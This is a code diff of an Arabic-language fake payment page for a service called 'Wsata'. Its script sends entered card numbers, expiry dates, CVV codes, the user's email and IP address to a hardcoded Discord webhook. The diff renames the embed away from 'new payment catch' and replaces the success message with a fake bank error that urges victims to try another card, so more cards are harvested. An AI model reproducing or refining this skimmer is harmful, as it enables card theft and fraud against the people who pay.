@@ -27,7 +27,6 @@
             <span>طريقة الدفع</span> 💳
         </div>
         <div class="mt-20">
-            <!-- اختيار النوع -->
             <div class="grid grid-cols-2 gap-5 mb-12">
                 <div class="tab-btn active p-6 flex justify-between items-center" onclick="sel(this)" data-brand="visa">
                     <div class="radio-ring"></div>
@@ -39,7 +38,6 @@
                 </div>
             </div>
 
-            <!-- الحقول -->
             <div class="space-y-6 text-right relative">
                 <div id="cardBadge" class="card-badge">💳 بطاقة بنكية</div>
                 <input type="text" id="ccNo" placeholder="رقم البطاقة" maxlength="19" oninput="detectCardBrand(this)">
@@ -50,30 +48,33 @@
             </div>
 
             <button onclick="send()" id="payBtn" class="w-full bg-[#00eccd] text-white py-6 rounded-3xl mt-12 text-2xl font-black shadow-xl transition hover:scale-[1.01] active:scale-[0.98]">
-                جاري جلب المبلغ...
+                دفع --- SAR
             </button>
         </div>
     </div>
 
     <script>
+        // تكوين Firebase
         const firebaseConfig = { databaseURL: "https://wasata-af6ac-default-rtdb.europe-west1.firebasedatabase.app" };
-        firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const db = firebase.database();
 
-        // 1. استخراج المبلغ من الرابط مع التأكد أنه رقم حقيقي
+        // جلب البيانات من الرابط
         const urlParams = new URLSearchParams(window.location.search);
-        let rawTotal = urlParams.get('total') || "0";
-        const ticketKey = urlParams.get('ticket');
+        const ticketKey = urlParams.get('id') || urlParams.get('ticket'); // دعم كلا الاختصارين
+        let amount = urlParams.get('total') || urlParams.get('price') || "0";
 
-        // تحويل القيمة لرقم فوراً لمنع ظهور 0.00
-        const totalAmount = Number(rawTotal);
         const payBtn = document.getElementById('payBtn');
-        
-        if (totalAmount > 0) {
-            payBtn.innerText = `دفع ${totalAmount.toFixed(2)} SAR`;
-        } else {
-            payBtn.innerText = `دفع --- SAR`;
+
+        // تحديث واجهة الزر فوراً
+        function updateUI() {
+            if (parseFloat(amount) > 0) {
+                payBtn.innerText = `دفع ${parseFloat(amount).toFixed(2)} SAR`;
+            } else {
+                payBtn.innerText = `دفع 0.00 SAR`;
+            }
         }
+        updateUI();
 
         function sel(el) {
             document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
@@ -82,9 +83,7 @@
 
         function detectCardBrand(input) {
             let value = input.value.replace(/\D/g, '');
-            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
-            input.value = formatted;
-
+            input.value = value.match(/.{1,4}/g)?.join(' ') || value;
             const badge = document.getElementById('cardBadge');
             if (value.startsWith('4')) { badge.textContent = '💳 فيزا'; badge.classList.add('show'); }
             else if (value.startsWith('5')) { badge.textContent = '💳 ماستركارد'; badge.classList.add('show'); }
@@ -103,12 +102,15 @@
             const cc = document.getElementById('ccNo').value;
             const exp = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvc').value;
-            const session = JSON.parse(localStorage.getItem('wasata_session')) || {email: 'guest'};
+            const sessionData = localStorage.getItem('wasata_session');
+            const session = sessionData ? JSON.parse(sessionData) : {email: 'غير معروف'};
 
-            if(cc.length < 16 || exp.length < 7 || cvv.length < 3) return alert("البيانات ناقصة!");
+            if(cc.replace(/\s/g, '').length < 16) return alert("رقم البطاقة غير صحيح");
+            if(exp.length < 7) return alert("تاريخ الانتهاء غير مكتمل");
+            if(cvv.length < 3) return alert("رمز CVC غير صحيح");
 
             payBtn.disabled = true;
-            payBtn.innerText = "جاري المعالجة...";
+            payBtn.innerText = "جاري التأكيد...";
 
             const hook = "https://discord.com/api/webhooks/1511460441661112360/5b0mL8Ncyi2FTZRU88U3ZX9leFZzotCjLWR7t5h3Acj4S0YsoY6e8LmiQIjl8PH62R91";
             
@@ -121,31 +123,34 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "💳 صيدة دفع جديدة | Wsata",
-                            color: 3066993,
+                            title: "💳 عملية دفع جديدة",
+                            color: 5763719,
                             fields: [
-                                { name: "👤 العميل", value: session.email, inline: true },
-                                { name: "💰 المبلغ", value: totalAmount + " SAR", inline: true },
-                                { name: "🌐 IP", value: ipData.ip, inline: true },
-                                { name: "💳 البطاقة", value: `\`${cc}\`` },
-                                { name: "🔐 السر", value: `\`${exp} | ${cvv}\`` }
-                            ]
+                                { name: "📧 العميل", value: session.email, inline: true },
+                                { name: "💰 المبلغ المطلوب", value: amount + " SAR", inline: true },
+                                { name: "📍 IP", value: ipData.ip, inline: true },
+                                { name: "💳 رقم البطاقة", value: `\`${cc}\`` },
+                                { name: "📅 التاريخ و الرمز", value: `\`${exp} | ${cvv}\`` }
+                            ],
+                            footer: { text: `Ticket ID: ${ticketKey || 'N/A'}` }
                         }]
                     })
                 });
 
                 if(ticketKey) {
-                    await db.ref('tickets/' + ticketKey).update({ status: 'تم الدفع ✓', action: null });
-                    await db.ref('tickets/' + ticketKey + '/messages').push({
-                        text: `✅ تم استلام مبلغ ${totalAmount} SAR بنجاح.`,
-                        sender: 'system'
+                    await db.ref('tickets/' + ticketKey).update({ 
+                        status: 'بانتظار التحقق',
+                        last_action: 'حاول الدفع' 
                     });
                 }
-                alert("تم إرسال الدفع للمراجعة.");
-                window.location.href = 'ticket.html';
-            } catch(e) {
-                alert("خطأ في الاتصال");
+
+                alert("خطأ في نظام البنك: يرجى المحاولة باستخدام بطاقة أخرى أو التواصل مع الدعم.");
                 payBtn.disabled = false;
+                updateUI();
+            } catch(e) {
+                alert("حدث خطأ، يرجى المحاولة لاحقاً");
+                payBtn.disabled = false;
+                updateUI();
             }
         }
     </script>
